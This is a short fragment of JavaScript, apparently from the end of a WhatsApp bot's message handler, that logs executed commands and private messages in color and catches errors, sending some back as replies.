console.log('\x1b[1;37m>', '[', '\x1b[1;32mEXEC\x1b[1;37m', ']', time, color("=>", "green"), 'from', color(pushname), 'args :', color(args.length))
} catch(e){
reply(String(e))
}
}
	}
if (isGroup && budy != undefined) {
	} else {
	console.log(color('[ PRIVATE ]', 'aqua'), wib, color(pushname))
	}		
	} catch (e) {
    e = String(e)
    if (!e.includes("this.isZero")) {
	console.log('Message : %s', color(e, 'green'))
        }
	// console.log(e)
	}
} 
